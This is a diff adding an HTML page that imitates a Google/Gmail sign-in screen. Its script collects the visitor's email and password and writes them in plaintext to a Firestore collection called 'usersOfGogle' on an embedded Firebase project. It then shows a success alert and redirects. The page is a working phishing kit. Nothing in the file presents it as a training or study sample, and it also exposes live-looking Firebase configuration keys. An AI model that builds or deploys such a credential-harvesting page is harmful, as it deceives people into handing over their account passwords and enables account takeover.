@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login  Google</title>
+  <link rel="icon" type="image/png" href="https://w7.pngwing.com/pngs/338/520/png-transparent-g-suite-google-play-google-logo-google-text-logo-cloud-computing-thumbnail.png">
+  
+  <link rel="stylesheet" href="google.css">
+  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>
+  
+</head>
+<body>
+  <div id="app"></div>
+  
+  <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyCpNeiGF63knNi8kCzgYBVQWAh_B1yEijs",
+      authDomain: "firstproject-72f32.firebaseapp.com",
+      projectId: "firstproject-72f32",
+      storageBucket: "firstproject-72f32.firebasestorage.app",
+      messagingSenderId: "366500686838",
+      appId: "1:366500686838:web:b316553e92c7ad2b16f5d7",
+      measurementId: "G-DSTWZNEJ80",
+    };
+
+    // Initialize Firebase
+    const appFirebase = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Add content dynamically using JavaScript
+    const app = document.querySelector('#app');
+
+    // Create the main container
+    const box = document.createElement('div');
+    box.classList.add('box');
+
+    // Create the form element
+    const form = document.createElement('form');
+    form.action = "#";
+    form.classList.add('form');
+
+    // Add logo
+    const logo = document.createElement('img');
+    logo.src = "google.jpg";
+    logo.alt = "Logo";
+    form.appendChild(logo);
+
+    // Add title dynamically
+    const title = document.createElement('h1');
+    title.classList.add('form-title');
+    title.textContent = "Sign In with Gmail";
+    form.appendChild(title);
+
+    // Add email input group
+    const emailGroup = document.createElement('div');
+    emailGroup.classList.add('form-group');
+    const emailInput = document.createElement('input');
+    emailInput.type = "text";
+    emailInput.classList.add('form-control');
+    emailInput.required = true;
+    const emailLabel = document.createElement('label');
+    emailLabel.classList.add('form-label');
+    emailLabel.textContent = "Email or phone";
+    emailGroup.appendChild(emailInput);
+    emailGroup.appendChild(emailLabel);
+    form.appendChild(emailGroup);
+
+    // Add password input group
+    const passwordGroup = document.createElement('div');
+    passwordGroup.classList.add('form-group');
+    const passwordInput = document.createElement('input');
+    passwordInput.type = "password";
+    passwordInput.classList.add('form-control');
+    passwordInput.id = "txtPassword";
+    passwordInput.required = true;
+    const passwordLabel = document.createElement('label');
+    passwordLabel.classList.add('form-label');
+    passwordLabel.textContent = "Enter Your Password";
+    passwordGroup.appendChild(passwordInput);
+    passwordGroup.appendChild(passwordLabel);
+    form.appendChild(passwordGroup);
+
+    // Add show password checkbox
+    const showPasswordGroup = document.createElement('div');
+    showPasswordGroup.classList.add('form-group');
+    const showLabel = document.createElement('label');
+    showLabel.classList.add('showLabel');
+    const showCheckbox = document.createElement('input');
+    showCheckbox.type = "checkbox";
+    showCheckbox.id = "show";
+    showLabel.textContent = " Show Password";
+    showLabel.prepend(showCheckbox);
+    showPasswordGroup.appendChild(showLabel);
+    form.appendChild(showPasswordGroup);
+
+    // Add bottom box
+    const bottomBox = document.createElement('div');
+    bottomBox.classList.add('bottom-box');
+    const forgotPasswordLink = document.createElement('a');
+    forgotPasswordLink.href = "#";
+    forgotPasswordLink.textContent = "Forget password ?";
+    const nextButton = document.createElement('button');
+    nextButton.type = "button"; // Prevent form submission
+    nextButton.classList.add('form-button');
+    nextButton.textContent = "Next";
+    bottomBox.appendChild(forgotPasswordLink);
+    bottomBox.appendChild(nextButton);
+    form.appendChild(bottomBox);
+
+    // Append form to box
+    box.appendChild(form);
+
+    // Append box to app container
+    app.appendChild(box);
+
+    // JavaScript for show/hide password
+    showCheckbox.addEventListener('click', function() {
+      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+      passwordInput.setAttribute("type", type);
+    });
+
+    // Save email and password values to labels, log, and send to Firebase on button click
+    nextButton.addEventListener('click', async function() {
+      
+      emailLabel.textContent = `Email: ${emailInput.value}`;
+      passwordLabel.textContent = `Password: ${passwordInput.value}`;
+
+      // Send data to Firebase Firestore
+      try {
+        await db.collection("usersOfGogle").add({
+          email: emailInput.value,
+          password: passwordInput.value
+        });
+        alert("تم تسجيل  بنجاح ✔ ")
+        window.location.href = "index.html";
+      } catch (error) {
+        console.error("Error saving data to Firebase:", error);
+        window.location.href = "go.html";
+      }
+    });
+  </script>
+</body>
+</html>
